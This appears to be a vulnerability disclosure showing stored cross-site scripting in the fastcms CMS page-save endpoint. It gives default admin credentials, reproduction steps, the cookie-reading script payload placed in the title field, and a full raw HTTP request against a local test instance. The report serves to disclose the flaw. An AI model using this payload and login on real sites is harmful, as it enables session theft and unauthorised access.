CMS:https://github.com/my-fastcms/fastcms/

Vulnerability http://127.0.0.1:8080/fastcms/api/admin/page/save

POST form-data parameter title=" " exists stored cross-site scripting

Copy Steps
1.Go to administrator login

http://127.0.0.1:8080/fastcms/

Default administrator access information username:admin password: 1

2.Click on "Page" and click on "New Page"
![295873542-05741a25-8139-4c89-bb98-101c97e4f93e](https://github.com/biantaibao/XSS/assets/131763503/16ed9fd1-b9ce-405a-9b79-b5488485c902)


3.Put Payload into the title parameter

Payload:<script>alert(document.cookie)</script>
![image](https://github.com/biantaibao/XSS/assets/131763503/5bbafc53-ae85-47f1-8481-3994fa3c35af)

4.Click on Save

Transmission packet

POST /fastcms/api/admin/page/save HTTP/1.1

Host: 127.0.0.1:8080

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

Accept: application/json, text/plain, /

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiMSIsInVzZXJJZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImV4cCI6MTcwNDk4MjgzNX0.BqRd5hHJ5rZQHfCwR1JwyaQT_iyFPyhbBIes1Paj-eg

ClientId: 5986012cabe54397a001bf61b4d88706

Content-Type: application/x-www-form-urlencoded

Content-Length: 305

Origin: http://127.0.0.1:8080

Connection: close

Referer: http://127.0.0.1/fastcms.html

Cookie: Hm_lvt_2f24154b3f87697d36a4e2a638b68aaa=1704782281; JSESSIONID=36080a69-5232-4088-85be-6074f45e49e2; Hm_lpvt_2f24154b3f87697d36a4e2a638b68aaa=1704782281; Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1704964823; Hm_lpvt_f8cddee34ca21f05373a9388cfdd798b=1704966995

id=3&createUserId=1&title=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&path=11&contentHtml=%3Cp%3E1%3C%2Fp%3E&outLink=&seoKeywords=1&seoDescription=1&summary=11&thumbnail=&style=&status=publish&suffix=&viewCount=0&commentEnable=false&created=&updated=&url=http%3A%2F%2F192.168.43.1%3A8080%2Fp%2F3

5.Payload will trigger when a user visits on http://127.0.0.1:8080/p/3
![image](https://github.com/biantaibao/XSS/assets/131763503/beb9c9c6-ca5c-46cb-818b-3103a0f4be33)


